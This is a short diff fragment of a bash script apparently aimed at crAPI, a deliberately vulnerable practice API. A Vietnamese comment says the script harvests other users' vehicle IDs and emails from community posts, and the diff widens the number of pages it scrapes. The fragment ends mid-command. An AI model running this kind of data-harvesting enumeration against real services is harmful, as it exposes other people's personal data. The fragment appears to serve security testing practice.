@@ -19,7 +19,7 @@ mapfile -t TLS < <(crapi_curl_tls_opts)
 
 # Quét nhiều trang community/posts/recent, gom (vehicleid, email) của NGƯỜI KHÁC.
 OUTJSON="$OUT/seed-verify.json"
-{ for off in $(seq 0 30 300); do
+{ for off in $(seq 0 30 900); do
     curl -s -A "$BROWSER_UA" "${TLS[@]}" -b "$J" --max-time 20 \
       "$BFF_URL/community/api/v2/community/posts/recent?limit=30&offset=$off"; echo
   done; } | ATTACKER_EMAIL="$ATTACKER_EMAIL" OUTJSON="$OUTJSON" python3 -c '
